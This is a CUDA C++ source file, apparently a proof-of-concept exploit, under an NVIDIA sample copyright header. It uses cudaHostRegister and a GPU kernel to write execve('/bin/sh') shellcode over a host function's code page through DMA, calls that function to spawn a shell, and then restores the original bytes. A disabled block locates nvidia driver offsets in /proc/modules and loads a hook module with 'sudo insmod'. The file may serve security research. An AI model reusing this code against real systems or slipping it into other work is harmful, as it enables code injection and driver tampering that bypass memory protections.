/**
 * Copyright 1993-2012 NVIDIA Corporation.  All rights reserved.
 *
 * Please refer to the NVIDIA end user license agreement (EULA) associated
 * with this source code for terms and conditions that govern your use of
 * this software. Any use, reproduction, disclosure, or distribution of
 * this software and related documentation outside the terms of the EULA
 * is strictly prohibited.
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <cuda.h>
#include <fstream>
#include <string>
#include <iostream>
#include <sstream>



#define ALIGN 0x1000
using namespace std;

// Some dirtry tricks, should be replaced by mmap()
void *aligned_malloc(int size) {
    void *mem = malloc(size+ALIGN+sizeof(void*));
    void **ptr = (void**)((long)(mem+ALIGN+sizeof(void*)) & ~(ALIGN-1));
    ptr[-1] = mem;
    return ptr;
}

void aligned_free(void *ptr) {
    free(((void**)ptr)[-1]);
}




//#define CU_MEMHOSTREGISTER_PORTABLE   0x01

//static const int WORK_SIZE = 256;

/**
 * This macro checks return value of the CUDA runtime call and exits
 * the application if the call failed.
 */
//int global;

#define CUDA_CHECK_RETURN(value) {											\
	cudaError_t _m_cudaStat = value;										\
	if (_m_cudaStat != cudaSuccess) {										\
		fprintf(stderr, "Error %s at line %d in file %s\n",					\
				cudaGetErrorString(_m_cudaStat), __LINE__, __FILE__);		\
		exit(1);															\
	} }

#define CUDA_CHECK_NORETURN(value) {											\
	cudaError_t _m_cudaStat = value;										\
	if (_m_cudaStat != cudaSuccess) {										\
		fprintf(stderr, "Error %s at line %d in file %s\nContinue\n",					\
				cudaGetErrorString(_m_cudaStat), __LINE__, __FILE__);		\
	} }


__device__ char * backup_buf;

/* CUDA kernel to copy the shellcode. Basically copies to source with given offset. */
__global__ void PixsysCuda(char * d_source, int offset)
{
	if (threadIdx.x == 0) {
		backup_buf = (char *) malloc(1024 * sizeof(char));
	}
	__syncthreads();

	char shellcode[] = {
			"\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f"
			"\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57"
			"\x54\x5f\x6a\x3b\x58\x0f\x05\x90\x90\x90"
	};

  backup_buf[threadIdx.x] = (d_source+offset)[threadIdx.x];
  (d_source+offset)[threadIdx.x] = shellcode[threadIdx.x];
}

__global__ void PixsysRecover(char * d_source, int offset) {
  (d_source+offset)[threadIdx.x] = backup_buf[threadIdx.x];
}

void Stub_Funct ()
{
	printf("NOTHING Here!\n");
	__asm__(
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
	);
}

/**
 * Host function that prepares data array and passes it to the CUDA kernel.
 */
typedef struct hidden_driver_info
{
	long int start_addr;
	long int end_addr;
} hidden_driver_info ,*p_hidden_info;

typedef void (*s_funct) () ;
int main(void) {

	int pagesize = 0x1000;
	s_funct f;
	pagesize = getpagesize(); // get Page size of system (usually 0x1000)
	//printf("page size is: %d\n",pagesize);

	p_hidden_info info_for_cuda_driver = (p_hidden_info)aligned_malloc(sizeof(hidden_driver_info)); // malloc info hiden buffer
	info_for_cuda_driver->start_addr = 0x4001; // unused. will be filled later
	info_for_cuda_driver->end_addr = 0x50003; // unused.

	//printf("start addr 0x%llx, 0x%llx\n",info_for_cuda_driver->start_addr,info_for_cuda_driver->end_addr );
	printf("info buffer addr: 0x%llx\n",(unsigned long)info_for_cuda_driver);

	char * real_buff = (char*)aligned_malloc(pagesize*sizeof(char)); // Malloc alligned buffer.

	memset(real_buff,0x4141,pagesize*sizeof(char)); // Fill buffer with 414141

	/*calculate the victim function parameters*/
	f=&Stub_Funct;
	int offset = (unsigned long)f % 0x1000;
	int base = ((unsigned long)f / 0x1000)* 0x1000;
	f();
	printf("Stub Function Address: 0x%lx\n",(unsigned long)f);
	printf("Stub Function offset: 0x%lx\n",(unsigned long)offset);
	printf("Stub Function base: 0x%lx\n",(unsigned long)base);
	fflush(stdout);

	//printf("Buffer: 0x%08x\n",*(unsigned int *)real_buff);

	//Set hidden Address:
	info_for_cuda_driver->start_addr = (unsigned long)base;

#if 0
	//Load kernel module:
	ifstream modules_fd("/proc/modules");
	string str;
	int addr_offset_from_nvidia = 35;
	unsigned long int base_nv_value, map_addr, lock_addr;
	string nvidia_base_addr;
	string m_lock_addr;
	string dma_map_addr;
	stringstream sstr;

  while (getline(modules_fd, str))
  {
		size_t pos = str.find("nvidia 1");
    if (pos != string::npos)
		{
			pos = str.find("0x");
			nvidia_base_addr = str.substr(pos+2);
			cout << "BASE ADDR IS: " << nvidia_base_addr << "\n";
			sstr << nvidia_base_addr;
			sstr >> hex >> base_nv_value;
			break;
		}
		// Process str
  }
	cout << "Base Nv addr hex is: " << hex << base_nv_value << "\n";
	map_addr = base_nv_value + 0x570bd0; //Known offset
	lock_addr = base_nv_value + 0x5770c0;
	sstr.str("");
	//cout << "S:" << map_addr << "\n";
	sstr << map_addr;
	dma_map_addr = sstr.str();
	sstr.str("");
	sstr << lock_addr;
	m_lock_addr = sstr.str();

	cout << "nv_dma_map_pages addr is: " << dma_map_addr << "\n os_lock_user_pages addr is :" << m_lock_addr << "\n";
	string CMD = "sudo insmod hook.ko m_lock_addr=0x" + m_lock_addr + " dma_map_addr=0x" + dma_map_addr;
	cout << "CMD is: " << CMD << "\n";
	system(CMD.c_str());
	sleep(10);
#endif

	char * d_real_buff;
	char * d_target;

	char * h_target = (char*)malloc(2*pagesize*sizeof(char*));
	//printf("TARGET a host in place Page2: 0x%08x",*(unsigned int *)(h_target+pagesize));
	CUDA_CHECK_RETURN(cudaMalloc((void **)&d_target, 2*pagesize*sizeof(char))) ;

	printf("GOING IN!\n");
	fflush(stdout);

CUDA_CHECK_NORETURN(cudaGetLastError());

	/* Try to set up the mallicious bit */
	try
	{
		cudaHostRegister((void *)0x0400000, sizeof(hidden_driver_info), CU_MEMHOSTREGISTER_PORTABLE) ;
		cudaHostRegister((void *)0x0800000, sizeof(hidden_driver_info), CU_MEMHOSTREGISTER_PORTABLE) ;
		cudaHostRegister((void *)0x01200000, sizeof(hidden_driver_info), CU_MEMHOSTREGISTER_PORTABLE) ;
	}
	catch (...)
	{
		printf("NAH");
	}

CUDA_CHECK_NORETURN(cudaGetLastError());

	/* register the info buffer. First things first... */
	CUDA_CHECK_RETURN(cudaHostRegister((void *)info_for_cuda_driver, sizeof(hidden_driver_info), CU_MEMHOSTREGISTER_PORTABLE)) ;
	/* Map what a Nice guy would think is a benevelent buffer.
	Note : Data is copied from user space hidden buffer. It can be changed afterwards. Will not effect Driver!*/
	CUDA_CHECK_RETURN(cudaHostRegister((void *)real_buff, pagesize*sizeof(char), CU_MEMHOSTREGISTER_PORTABLE)) ;

	/* Get device pointer of this buffer */
	CUDA_CHECK_RETURN(cudaHostGetDevicePointer((void**)&d_real_buff,real_buff,0));
	//printf("Device PTR is : 0x%08x\n",(unsigned int *)d_real_buff);
	fflush(stdout);

CUDA_CHECK_NORETURN(cudaGetLastError());

	/* info buffer in UM can be changed now. No effect. */
	//info_for_cuda_driver->start_addr = (unsigned long)stdout->_IO_write_base;
	//printf("write_base addr: 0x%lx\n",(unsigned long)stdout->_IO_write_base);
	//(stdout->_IO_write_base)[1]='W';

	/*Activate cuda kernel, that copies shellcode */
	PixsysCuda<<<1,32>>>(d_real_buff,offset);


	CUDA_CHECK_RETURN(cudaThreadSynchronize());	// Wait for the GPU launched work to complete

	f(); // Call "non malicious" function again.
	CUDA_CHECK_NORETURN(cudaGetLastError());

	// Recover f()
	printf("Now recover f()\n");
	PixsysRecover<<<1,32>>>(d_real_buff,offset);


		CUDA_CHECK_RETURN(cudaMemcpy((void *)h_target,d_target, pagesize*sizeof(char),cudaMemcpyDeviceToHost));
		//printf("Target is: 0x%08x\n",*(unsigned int *) h_target);
		//printf("STRNG Target is 0x%08x",*(unsigned int *)(h_target+pagesize));
		fflush(stdout);
		CUDA_CHECK_RETURN(cudaHostUnregister((void *)real_buff)) ;
		CUDA_CHECK_RETURN(cudaThreadSynchronize());	// Wait for the GPU launched work to complete
		CUDA_CHECK_NORETURN(cudaGetLastError());
	//}
	//sleep(3000);
	/*for (i = 0; i < WORK_SIZE; i++)
		idata[i] = (unsigned int) i;

	CUDA_CHECK_RETURN(cudaMalloc((void**) &d, sizeof(int) * WORK_SIZE));
	CUDA_CHECK_RETURN(
			cudaMemcpy(d, idata, sizeof(int) * WORK_SIZE, cudaMemcpyHostToDevice));

	bitreverse<<<1, WORK_SIZE, WORK_SIZE * sizeof(int)>>>(d);
	*/
	//CUDA_CHECK_RETURN(cudaThreadSynchronize());	// Wait for the GPU launched work to complete
	//CUDA_CHECK_RETURN(cudaGetLastError());
	/*CUDA_CHECK_RETURN(cudaMemcpy(odata, d, sizeof(int) * WORK_SIZE, cudaMemcpyDeviceToHost));

	for (i = 0; i < WORK_SIZE; i++)
		printf("Input value: %u, device output: %u\n", idata[i], odata[i]);

	CUDA_CHECK_RETURN(cudaFree((void*) d));
	CUDA_CHECK_RETURN(cudaDeviceReset());
*/
	return 0;
}
